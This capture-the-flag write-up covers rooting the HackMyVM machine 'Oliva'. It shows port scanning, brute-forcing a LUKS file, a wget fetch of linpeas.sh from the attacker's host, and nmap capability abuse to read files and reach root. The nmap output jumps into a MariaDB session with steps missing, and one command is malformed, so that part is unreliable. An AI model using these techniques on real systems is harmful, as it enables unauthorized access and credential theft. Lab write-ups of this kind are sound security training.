@@ -1,0 +1,230 @@
+---
+title: Oliva
+date: '2025-06-27'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - Easy
+  - LINUX
+  - Nmap
+cover: /mc/uploads/2025/06/oliva.png
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hello! Today we're going to try to pwn "Oliva," a machine from HackMyVM
+
+## Recon
+
+As always, we'll start by running nmap to identify the open ports.
+
+```bash
+ζ nmap -sV -sC 192.168.138.106 -T5                            
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-26 20:14 EDT
+Nmap scan report for 192.168.138.106
+Host is up (0.00071s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 6d:84:71:14:03:7d:7e:c8:6f:dd:24:92:a8:8e:f7:e9 (ECDSA)
+|_  256 d8:5e:39:87:9e:a1:a6:75:9a:28:78:ce:84:f7:05:7a (ED25519)
+80/tcp open  http    nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+|_http-title: Welcome to nginx!
+MAC Address: 08:00:27:0E:06:0C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+Now, we're going to fuzz the website to discover new **endpoints**. After doing that, we found another index file **index.php**.
+
+```bash
+ζ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://192.168.138.106  -x php,html,txt,js 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.138.106
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,js,php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 615]
+/index.php            (Status: 200) [Size: 69]
+```
+So entering **index.php**, we can see there’s a downloadable file called oliva . Our next step was to use tools like exiftool and file to check the metadata and determine what kind of file it is.
+
+## Initial access 
+
+After trying exiftool without success, we used file and found out the file type:
+
+```bash
+ζ file oliva                                                                                 
+oliva: LUKS encrypted file, ver 2, header size 16384, ID 3, algo sha256, salt 0x14fa423af24634e8..., UUID: 9a391896-2dd5-4f2c-84cf-1ba6e4e0577e, crc 0x6118d2d9b595355f..., at 0x1000 {"keyslots":{"0":{"type":"luks2","key_size":64,"af":{"type":"luks1","stripes":4000,"hash":"sha256"},"area":{"type":"raw","offse
+```
+so oliva is Luks and its encrypted file.
+
+So, oliva is a LUKS-encrypted file. LUKS stands for Linux Unified Key Setup it's a disk encryption specification used in Linux systems. It allows us to encrypt block devices such as SSDs or hard drives.
+
+Our goal now is to find the passphrase to decrypt this file. We used bruteforce-luks, which is a tool built into Kali Linux specifically for brute-forcing LUKS passphrases. Since this tool can take a long time to find the password, I tried using a small portion of the rockyou.txt wordlist and got lucky!
+
+```bash
+ζ sudo bruteforce-luks -t 6 -f /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-55.txt oliva                       
+[sudo] password for kali: 
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+Tried passwords: 970
+Tried passwords per second: 2.383292
+Last tried password: tucker
+
+Password found: bebita
+```
+With this password, we created a decrypted volume using cryptsetup:
+
+```bash
+ζ sudo cryptsetup luksOpen  oliva  new_oliva                                                 
+[sudo] password for kali: 
+Enter passphrase for oliva: #bebita
+```
+```text
+The new volume, new_oliva, is now available under /dev/mapper.
+```
+
+```bash
+ζ ls /dev/mapper/new_oliva                                                                   
+/dev/mapper/new_oliva
+```
+Next, we needed to mount this volume. First, we created a directory /mnt/oliva and mounted the decrypted volume there:
+
+```bash
+ζ sudo /mnt/oliva
+ζ sudo mount /dev/mapper/new_oliva /mnt/oliva
+```
+Then we navigated into the mounted directory and listed its contents:
+
+```bash
+ζ cd /mnt/oliva 
+ζ ls                                                                                         
+lost+found  mypass.txt
+ζ cat mypass.txt                                                                             
+Yesthatsmypass!
+```
+We now had valid credentials — username oliva and password Yesthatsmypass!. So we SSH'd into the machine:
+
+```bash
+ssh oliva@192.168.138.106 
+oliva@192.168.138.106's password: #Yes....pass!
+```
+After authenticating, we were able to read the user flag.
+
+Next, we wanted to escalate privileges. To help identify potential weaknesses, we uploaded linpeas.sh to the target machine:
+
+```bash
+ζ python -m http.server 8000
+```
+target machine :
+
+```bash
+oliva@oliva:~$ wget http://192.168.138.102:8000/linpeas.sh
+```
+## Priv Esc
+
+Linpeas highlighted several things, but one stood out , capabilities on /usr/bin/nmap. This means we could potentially abuse it for privilege escalation.
+
+```bash
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+
+Files with capabilities (limited to 50):
+/usr/bin/nmap cap_dac_read_search=eip
+/usr/bin/ping cap_net_raw=ep
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*          
+tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*          
+tcp   LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*          
+tcp   LISTEN 0      511             [::]:80           [::]:*          
+tcp   LISTEN 0      128             [::]:22           [::]:* 
+```
+I checked **[GTFOBins ](https://gtfobins.github.io/#)**to see how we could abuse nmap for privilege escalation. While reverse shells and writing files didn't work, reading files did.
+
+So, I used **[nmap](https://gtfobins.github.io/gtfobins/nmap/#file-read) **to read the **index.php** file located at **/var/www/html/index.php**:
+
+```bash
+oliva@oliva:~$ /usr/bin/nmap -iL /var/www/html/index.php 
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-27 03:08 CEST
+---------results------
+Failed to resolve "".
+Failed to resolve " show databases;
++--------------------+
+| Database           |
++--------------------+
+| easy               |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0,000 sec)
+
+MariaDB [(none)]> use easy;
+
+MariaDB [easy]> show tables;
++----------------+
+| Tables_in_easy |
++----------------+
+| logging        |
++----------------+
+1 row in set (0,000 sec)
+
+MariaDB [easy]> select * from logging;
++--------+------+--------------+
+| id_log | uzer | pazz         |
++--------+------+--------------+
+|      1 | root | OhItwasEasy! |
++--------+------+--------------+
+1 row in set (0,000 sec)
+```
+We found the root password: OhItwasEasy!
+
+Now we just needed to switch to root using su:
+
+```bash
+oliva@oliva:~$ su root
+Contraseña: 
+root@oliva:/home/oliva# whoami && cat ~/rutflag.txt 
+root
+HMVnuTkm4MwFQNPmMJHRyW7
+```
+By the way… I almost forgot about the MySQL history! You can easily read the .mysql\_history file to find commands previously executed , including sensitive data like passwords.
+
+```bash
+root@oliva:~# ls -al
+total 32
+drwx------  4 root root 4096 jul  4  2023 .
+drwxr-xr-x 18 root root 4096 jul  4  2023 ..
+lrwxrwxrwx  1 root root    9 jul  4  2023 .bash_history -> /dev/null
+-rw-r--r--  1 root root  571 abr 10  2021 .bashrc
+drwxr-xr-x  3 root root 4096 jul  4  2023 .local
+-rw-------  1 root root  567 jul  4  2023 .mysql_history
+-rw-r--r--  1 root root  161 jul  9  2019 .profile
+-rw-------  1 root root   24 jul  4  2023 rutflag.txt
+drwx------  2 root root 4096 jul  4  2023 .ssh
+```
+**Anyway… GG!**
+
+**If you want an escalation similar to this one, you can try the MR.robot machine and read its [writeup](https://nutzh.top/try-hack-me/mrrobot/).**
